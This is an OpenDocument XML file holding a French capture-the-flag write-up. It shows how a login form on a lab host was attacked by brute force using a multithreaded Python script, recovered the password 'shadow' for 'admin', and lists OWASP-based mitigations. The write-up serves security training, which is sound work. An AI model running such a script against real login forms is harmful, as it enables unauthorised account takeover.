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D8500000458B4B1D0A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line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" style:text-underline-style="none" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" style:text-underline-style="none" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P5"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Times New Roman" fo:font-size="12pt" style:text-underline-style="none" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="italic" style:text-underline-style="none" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-size-complex="12pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify"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Courier New" fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P1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T1" style:family="text">
      <style:text-properties fo:color="#fb660a" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#0086d2"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#ff0086" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#0086f7"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ember login bruteforce</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">EXPLICATION</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Comme relevé en énumération (voir ENUMERATION – partie 1), l'application dispose d'une page de login à l'intention des utilisateurs du site. Le formulaire web est tout simple, avec un champ <text:span text:style-name="T6">username </text:span><text:span text:style-name="T7">et un champ </text:span><text:span text:style-name="T6">password</text:span><text:span text:style-name="T7">.</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">La requête envoyée lorsqu'on tente de se login passe le nom d'utilisateur et le mot de passe en paramètre d'URL :</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P10">http://192.168.1.37/?page=signin&amp;username=test&amp;password=test&amp;Login=Login</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Si le formulaire ainsi créé n'implémente pas une limitation du nombre de requêtes acceptées, et que l'un des utilisateurs a un mot de passe faible, alors il est possible de <text:span text:style-name="T6">bruteforce</text:span><text:span text:style-name="T7"> le formulaire.</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">(On a en réalité résolu ce flag d'abord par le biais de notre injection SQL décrite dans Member_Sql_Injection, mais au vu du nom de la base de données dans laquelle on a récupéré les credentials par ce biais, l'intention était plutôt ici d'illustrer une attaque par force brute).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">J'ai donc créé un petit script de bruteforce (multithread) afin de bruteforce le login, avec la wordlist de notre choix. On assume ici que si l'on tombe sur un bon mot de passe, la page sur laquelle on arrivera contiendra le mot "flag" (on aurait également pu jouer sur la taille de la réponse, qui est différente sur la page avec le flag. Cela aurait peut-être été mieux niveau performance).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T1">import</text:span> <text:span text:style-name="T2">requests</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">from</text:span> <text:span text:style-name="T2">multiprocessing</text:span> <text:span text:style-name="T1">import</text:span> <text:span text:style-name="T2">Pool</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">import</text:span> <text:span text:style-name="T2">sys</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T2">(len(sys.argv)</text:span> <text:span text:style-name="T2">!=</text:span> <text:span text:style-name="T5">2</text:span><text:span text:style-name="T2">)</text:span> <text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/><text:span text:style-name="T2">print</text:span> <text:span text:style-name="T2">(</text:span><text:span text:style-name="T3">'Usage : python3 md5decrypt.py &lt;WORDLIST&gt;'</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/><text:span text:style-name="T2">sys.exit(</text:span><text:span text:style-name="T5">1</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:span text:style-name="T2">filename</text:span> <text:span text:style-name="T2">=</text:span> <text:span text:style-name="T2">sys.argv[</text:span><text:span text:style-name="T5">1</text:span><text:span text:style-name="T2">]</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:span text:style-name="T1">def</text:span> <text:span text:style-name="T4">bruteforce_login</text:span><text:span text:style-name="T2">(password,</text:span> <text:span text:style-name="T2">URL=</text:span> <text:span text:style-name="T3">"http://192.168.1.37/index.php?page=signin"</text:span><text:span text:style-name="T2">)</text:span> <text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/><text:span text:style-name="T2">password</text:span> <text:span text:style-name="T2">=</text:span> <text:span text:style-name="T2">password.rstrip()</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/><text:span text:style-name="T2">response</text:span> <text:span text:style-name="T2">=</text:span> <text:span text:style-name="T2">requests.get(URL</text:span> <text:span text:style-name="T2">+</text:span> <text:span text:style-name="T2">f</text:span><text:span text:style-name="T3">"&amp;username=admin&amp;password={password}&amp;Login=Login"</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T2">(response.text.find(</text:span><text:span text:style-name="T3">'flag'</text:span><text:span text:style-name="T2">)</text:span> <text:span text:style-name="T2">!=</text:span> <text:span text:style-name="T2">-</text:span><text:span text:style-name="T5">1</text:span><text:span text:style-name="T2">)</text:span> <text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="8"/><text:span text:style-name="T2">print(f</text:span><text:span text:style-name="T3">"[+] Found working password : {password}"</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:span text:style-name="T1">with</text:span> <text:span text:style-name="T2">open(filename,</text:span> <text:span text:style-name="T3">'r'</text:span><text:span text:style-name="T2">,</text:span> <text:span text:style-name="T2">errors=</text:span><text:span text:style-name="T3">'replace'</text:span><text:span text:style-name="T2">)</text:span> <text:span text:style-name="T1">as</text:span> <text:span text:style-name="T2">wordlist</text:span> <text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/><text:span text:style-name="T2">passwords</text:span> <text:span text:style-name="T2">=</text:span> <text:span text:style-name="T2">wordlist.readlines()</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:s text:c="4"/><text:span text:style-name="T1">with</text:span> <text:span text:style-name="T2">Pool(</text:span><text:span text:style-name="T5">4</text:span><text:span text:style-name="T2">)</text:span> <text:span text:style-name="T1">as</text:span> <text:span text:style-name="T2">pool</text:span> <text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="8"/><text:span text:style-name="T2">results</text:span> <text:span text:style-name="T2">=</text:span> <text:span text:style-name="T2">pool.map(bruteforce_login,</text:span> <text:span text:style-name="T2">passwords)</text:span></text:p>
      <text:p text:style-name="P4">On essaie avec un nom d'utilisateur usuel, ici <text:span text:style-name="T6">admin </text:span><text:span text:style-name="T7">(on aurait également pu essayer root, ou les </text:span><text:soft-page-break/><text:span text:style-name="T7">noms d'utilisateur trouvés sur la page de recherche de membres).</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.951cm" draw:z-index="0"><draw:image xlink:href="Pictures/2000000700004D8500000458B4B1D0AE.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">On finit par trouver le mot de passe <text:span text:style-name="T6">shadow</text:span><text:span text:style-name="T7">. On s'en sert pour se connecter via la page de login de l'application, et on récupère un </text:span><text:span text:style-name="T6">flag</text:span><text:span text:style-name="T7">.</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P8">RESSOURCES</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le script <text:span text:style-name="T6">bruteforce.py </text:span>présenté ci-dessus qui permet d'attaquer en force brute le formulaire de login avec la wordlist de notre choix.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8">MITIGATION</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T8"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T8">&gt; </text:span>Une politique plus ferme en termes de mot de passe (caractères, nombres, majuscules, minuscules, symboles ...).</text:p>
      <text:p text:style-name="P5">&gt; Un mécanisme de régulation des demandes de login.</text:p>
      <text:p text:style-name="P5">&gt; Plus généralement, les suggestions de OWASP sont très complètes :</text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks</text:a> </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9M48S</meta:editing-duration>
    <meta:editing-cycles>6</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-11-03T13:09:27.44</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="1" meta:object-count="0" meta:page-count="2" meta:paragraph-count="33" meta:word-count="393" meta:character-count="2709"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>